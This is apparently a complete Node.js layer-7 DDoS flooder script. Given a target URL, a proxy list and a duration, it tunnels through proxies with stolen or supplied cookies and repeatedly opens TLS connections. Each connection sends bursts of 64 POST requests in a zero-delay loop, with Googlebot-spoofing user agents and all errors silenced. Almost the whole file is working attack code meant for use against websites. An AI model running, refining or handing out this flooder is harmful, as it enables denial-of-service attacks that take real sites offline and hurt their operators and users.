


process.on('uncaughtException', function() {});
process.on('unhandledRejection', function() {});
const net = require('net');
const fs = require('fs');
const url = require('url');
const request_2 = require('request');
var theJar = request_2.jar();
var path = require("path");
const execSync = require('child_process').execSync;
try {
    var colors = require('colors');
} catch (err) {
    console.log('\x1b[36mInstalling\x1b[37m the requirements');
    execSync('npm install colors');
    console.log('Done.');
    process.exit();
}
var fileName = __filename;
var file = path.basename(fileName);
try {
    var proxies = fs.readFileSync(process.argv[3], 'utf-8').toString().replace(/\r/g, '').split('\n');
    var browser_saves = process.argv[5];
} catch (err) {
    if (err.code !== 'ENOENT') throw err;
    console.log('\x1b[31m Error\x1b[37m: Proxy list not found.');
    console.log("\x1b[36m usage\x1b[37m: node " + file + " <Target> <proxies> <duration>");
    process.exit();
}

var target = process.argv[2];
var parsed = url.parse(target);
process.setMaxListeners(15);

setTimeout(() => {
    process.exit(1);
}, process.argv[4] * 1000);


const UAs = [
    "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)",
    "Mozilla/5.0 (Linux; Android 5.0; SM-G920A) AppleWebKit (KHTML, like Gecko) Chrome Mobile Safari (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.18247",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
];

function between(min, max) {  
  return Math.floor(
    Math.random() * (max - min) + min
  )
}

setInterval(async function() {
/*
var proxy = proxies[Math.floor(Math.random() * proxies.length)];
proxy = proxy.split(':');
*/

const legh_tokes = browser_saves.split('::').length;

const leghts = between(0, legh_tokes);

var Sring_selector = browser_saves.split('::')[leghts];

sda = Sring_selector.split('::')[0];

proxy_re = sda.split('#'); //selector proxy / cookie

var http = require('http'),
    tls = require('tls');

var req = http.request({
    host: proxy_re[0].split(':')[0],
    headers: {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
    'Cookie': proxy_re[1],
    },
    jar: theJar,
    rejectUnauthorized: false,
    port: proxy_re[0].split(':')[1],
    method: 'CONNECT',
    path: parsed.host+':443'
});

req.on('connect', function (res, socket, head) {
    var tlsConnection = tls.connect({
        host: parsed.host,
        ciphers: 'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
       // secureProtocol: 'TLSv1_1_method',
        secureOptions: 'SSL_OP_*',
        servername: parsed.host,
        secure: true,
        jar: theJar,
        rejectUnauthorized: false,
        sessionTimeout: 5000,
        socket: socket
    }, function () {
        for (let j = 0; j < 64; j++) {
        tlsConnection.write('POST / HTTP/1.3\r\nHost: ' + parsed.host + '\r\nReferer: '+target+'\r\nCookie: '+proxy_re[1]+'\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nuser-agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
    }
    });

    tlsConnection.on('error', function(data) {
        tlsConnection.end();
        tlsConnection.destroy();
    });

    tlsConnection.on('data', function (data) {
       // console.log(data.toString());
            setTimeout(function() {
            tlsConnection.destroy();
            return delete tlsConnection;
        }, 5000);
    });
});

req.end();
}, 0);